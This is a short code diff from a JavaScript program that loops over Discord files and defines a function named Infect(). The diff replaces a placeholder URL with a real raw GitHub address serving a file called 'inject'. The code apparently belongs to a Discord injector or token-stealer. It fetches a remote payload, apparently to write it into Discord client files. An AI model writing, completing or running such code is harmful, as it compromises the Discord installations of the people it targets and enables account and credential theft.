@@ -135,7 +135,7 @@ discords.forEach(function(file) {
     })
 });
 function Infect() {
-    https.get('GET THE URL ', (resp) => {
+    https.get('https://raw.githubusercontent.com/notthatskidagain/notbaba/main/inject', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
